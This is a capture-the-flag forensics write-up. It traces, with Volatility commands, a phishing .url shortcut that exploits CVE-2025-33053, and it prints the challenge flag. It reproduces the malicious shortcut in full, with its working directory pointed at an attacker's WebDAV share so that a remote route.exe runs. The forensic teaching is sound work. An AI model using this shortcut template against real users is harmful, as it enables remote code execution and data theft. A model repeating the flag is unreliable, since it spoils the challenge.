# Ophelia's Truth 1

> A detective at Moscow PD, Department 19, receives a message asking him to check the forensic analysis portal for a DNA report. Attached to the message is a file containing a link to the portal. He opens the attachment, but initially, nothing seems to happen, so he overlooks it. Later, he realizes that a crucial file from an ongoing case has gone missing.
>
> He has provided the forensic artifacts from his computer to you, his colleague at the cyber forensics department, to figure out what went wrong. Find:
> - The filename of the attachment
> - The ip from where the malware was executed
> - The CVE the attacker exploited
>
> Flag format: nite{file_name.ext_XXX.XXX.XXX.XXX_CVE-XXXX-XXXXX}
>
> Challenge Link: https://drive.proton.me/urls/WTX8DDNBWG#gtNS5LAjkzfN

**Author:** `Indrath`

**Flag:** `nite{dna_analysis_portal.url_10.72.5.205_CVE-2025-33053}`

Keeping the description in mind, we start by searching for relevant file artifacts using `filescan`. The extension `.url` is a common shortcut format in Windows, often used for web links.

We can search for files containing "dna" or with the `.url` extension:
```bash
python vol.py -f ophelia.raw windows.filescan.FileScan | grep dna

0xc50d0c562a90.0\Users\Igor\Documents\Important Links\dna_analysis_portal.url
```

Next, we extract the file content to understand its behavior. We use the virtual address found in the previous step:
```bash
python vol.py -f ophelia.raw windows.dumpfiles.DumpFiles --virtaddr=0xc50d0c562a90
```
Despite the "Error dumping file" message the content is successfully dumped. The content of the dumped `.url` file reveals a specific structure:
```ini
[InternetShortcut]
URL=C:\Program Files\Internet Explorer\iediagcmd.exe
WorkingDirectory=\\10.72.5.205\webdav\\
ShowCommand=7
IconIndex=13
IconFile=C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
Modified=20F06BA06D07BD014D
```

This is not a standard web shortcut. Instead of pointing to a website, the `URL` field points to a local system binary: `iediagcmd.exe` and the `WorkingDirectory` is set to a remote UNC path: `\\10.72.5.205\webdav\\`.

This configuration matches the signature of **CVE-2025-33053**.

When the user clicks this link, Windows executes `iediagcmd.exe`. This legitimate helper program attempts to launch another executable (in our case it happens to be `route.exe`). Because the `WorkingDirectory` is hijacked to point to the attacker's WebDAV server, `iediagcmd.exe` inadvertently loads and executes `route.exe` hosted on `10.72.5.205` instead of the expected local file.

